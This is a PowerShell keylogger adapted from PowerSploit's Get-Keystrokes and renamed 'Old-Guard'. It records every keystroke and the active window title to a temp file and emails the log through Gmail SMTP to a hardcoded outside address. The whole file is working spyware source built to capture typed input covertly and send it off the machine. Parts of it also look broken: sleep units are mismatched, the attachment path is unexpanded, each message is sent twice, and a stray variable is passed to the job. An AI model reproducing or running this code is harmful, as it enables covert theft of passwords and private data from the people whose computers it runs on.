function Old-Guard {
<#
.SYNOPSIS
 
    Logs keys pressed, time and the active window.
    
    PowerSploit Function: Get-Keystrokes
    Author: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    
.PARAMETER LogPath
    Specifies the path where pressed key details will be logged. By default, keystrokes are logged to %TEMP%\key.log.
.PARAMETER CollectionInterval
    Specifies the interval in minutes to capture keystrokes. By default, keystrokes are captured indefinitely.
.PARAMETER PollingInterval
    Specifies the time in milliseconds to wait between calls to GetAsyncKeyState. Defaults to 40 milliseconds.
.EXAMPLE
    Get-Keystrokes -LogPath C:\key.log
.EXAMPLE
    Get-Keystrokes -CollectionInterval 20
.EXAMPLE
    Get-Keystrokes -PollingInterval 35

#>
    [CmdletBinding()] Param (
        [Parameter(Position = 0)]
        [ValidateScript({Test-Path (Resolve-Path (Split-Path -Parent $_)) -PathType Container})]
        [String]
        $LogPath = "$($Env:TEMP)\key.log",

        [Parameter(Position = 1)]
        [UInt32]
        $CollectionInterval,

        [Parameter(Position = 2)]
        [Int32]
        $PollingInterval = 40,
        
        [Parameter(Position = 3)]
        [Int32]
        $EmailInterval = 300
    )

    $LogPath = Join-Path (Resolve-Path (Split-Path -Parent $LogPath)) (Split-Path -Leaf $LogPath)

    Write-Verbose "Logging keystrokes to $LogPath"

    $Initilizer = {
        $LogPath = 'REPLACEME'

        '"WindowTitle","TypedKey","Time"' | Out-File -FilePath $LogPath -Encoding unicode

        function KeyLog {
            [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null

            try
            {
                $ImportDll = [User32]
            }
            catch
            {
                $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
                $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
                $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
                $TypeBuilder = $ModuleBuilder.DefineType('User32', 'Public, Class')

                $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
                $FieldArray = [Reflection.FieldInfo[]] @(
                    [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
                )

                $PInvokeMethod = $TypeBuilder.DefineMethod('GetAsyncKeyState', 'Public, Static', [Int16], [Type[]] @([Windows.Forms.Keys]))
                $FieldValueArray = [Object[]] @(
                    'GetAsyncKeyState',
                    $True,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $PInvokeMethod = $TypeBuilder.DefineMethod('GetKeyboardState', 'Public, Static', [Int32], [Type[]] @([Byte[]]))
                $FieldValueArray = [Object[]] @(
                    'GetKeyboardState',
                    $True,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $PInvokeMethod = $TypeBuilder.DefineMethod('MapVirtualKey', 'Public, Static', [Int32], [Type[]] @([Int32], [Int32]))
                $FieldValueArray = [Object[]] @(
                    'MapVirtualKey',
                    $False,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $PInvokeMethod = $TypeBuilder.DefineMethod('ToUnicode', 'Public, Static', [Int32],
                    [Type[]] @([UInt32], [UInt32], [Byte[]], [Text.StringBuilder], [Int32], [UInt32]))
                $FieldValueArray = [Object[]] @(
                    'ToUnicode',
                    $False,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $PInvokeMethod = $TypeBuilder.DefineMethod('GetForegroundWindow', 'Public, Static', [IntPtr], [Type[]] @())
                $FieldValueArray = [Object[]] @(
                    'GetForegroundWindow',
                    $True,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $ImportDll = $TypeBuilder.CreateType()
            }

            Start-Sleep -Seconds $PollingInterval

                try
                {

                    #loop through typeable characters to see which is pressed
                    for ($TypeableChar = 1; $TypeableChar -le 254; $TypeableChar++)
                    {
                        $VirtualKey = $TypeableChar
                        $KeyResult = $ImportDll::GetAsyncKeyState($VirtualKey)

                        #if the key is pressed
                        if (($KeyResult -band 0x8000) -eq 0x8000)
                        {

                            #check for keys not mapped by virtual keyboard
                            $LeftShift    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000) -eq 0x8000
                            $RightShift   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000) -eq 0x8000
                            $LeftCtrl     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
                            $RightCtrl    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000
                            $LeftAlt      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000) -eq 0x8000
                            $RightAlt     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000) -eq 0x8000
                            $TabKey       = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000) -eq 0x8000
                            $SpaceBar     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000) -eq 0x8000
                            $DeleteKey    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000
                            $EnterKey     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
                            $BackSpaceKey = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000

                            if ($LeftShift -or $RightShift) {$LogOutput += '[Shift]'}
                            if ($LeftCtrl  -or $RightCtrl)  {$LogOutput += '[Ctrl]'}
                            if ($LeftAlt   -or $RightAlt)   {$LogOutput += '[Alt]'}
                            if ($TabKey)       {$LogOutput += '[Tab]'}
                            if ($SpaceBar)     {$LogOutput += '[SpaceBar]'}
                            if ($DeleteKey)    {$LogOutput += '[Delete]'}
                            if ($EnterKey)     {$LogOutput += '[Enter]'}
                            if ($BackSpaceKey) {$LogOutput += '[Backspace]'}

                            #check for capslock
                            if ([Console]::CapsLock) {$LogOutput += '[Caps Lock]'}

                            $MappedKey = $ImportDll::MapVirtualKey($VirtualKey, 3)
                            $KeyboardState = New-Object Byte[] 256
                            $CheckKeyboardState = $ImportDll::GetKeyboardState($KeyboardState)

                            #create a stringbuilder object
                            $StringBuilder = New-Object -TypeName System.Text.StringBuilder;
                            $UnicodeKey = $ImportDll::ToUnicode($VirtualKey, $MappedKey, $KeyboardState, $StringBuilder, $StringBuilder.Capacity, 0)

                            #convert typed characters
                            if ($UnicodeKey -gt 0) {
                                $TypedCharacter = $StringBuilder.ToString()
                                $LogOutput += ('['+  $TypedCharacter  +']')
                            }

                            #get the title of the foreground window
                            $TopWindow = $ImportDll::GetForegroundWindow()
                            $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle

                            #get the current DTG
                            $TimeStamp = (Get-Date -Format dd/MM:HH:mm)

                            #Create a custom object to store results
                            $ObjectProperties = @{'Key Typed' = $LogOutput;
                                                  'Time' = $TimeStamp;
                                                  'Window Title' = $WindowTitle}
                            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties

                            # Export-CSV doesn't have an append switch in PSv2
                            $CSVEntry = ($ResultsObject | ConvertTo-Csv -NoTypeInformation)[1]

                            #return results
                            Out-File -FilePath $LogPath -Append -InputObject $CSVEntry -Encoding unicode
                            Copy-item "$env:TEMP/key.log" -Destination "$env:TEMP/key_final.txt"
                            
                            #email results
                            $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
                            $SMTPInfo.EnableSsl = $true
                            $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('logsandstuff12', '')
                            $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'logsandstuff12@gmail.com' 
                            $ReportEmail.To.Add('warof1846@gmail.com')
                            $ReportEmail.Subject = 'Final Report - ' +[System.Net.Dns]::GetHostByName(($env:computerName)).HostName
                            $ReportEmail.Body = 'Report 001'
                            $ReportEmail.Attachments.Add('%temp%/key_final.txt')
                            $SMTPInfo.Send($ReportEmail)
                            $SMTPInfo.Send($ReportEmail)
                        }
                    }
                }
                catch {}
            }
    }

    $Initilizer = [ScriptBlock]::Create(($Initilizer -replace 'REPLACEME', $LogPath))

    Start-Job -InitializationScript $Initilizer -ScriptBlock {for (;;) {Keylog}} -Name keylogger $Initil | Out-Null

    if ($PSBoundParameters['CollectionInterval'])
    {
        $Timer = New-Object Timers.Timer($CollectionInterval * 60 * 1000)

        Register-ObjectEvent -InputObject $Timer -EventName Elapsed -SourceIdentifier ElapsedAction -Action {
            Stop-Job -Name keylogger
            Unregister-Event -SourceIdentifier ElapsedAction

            $Sender.Stop()
        } | Out-Null
    }

}
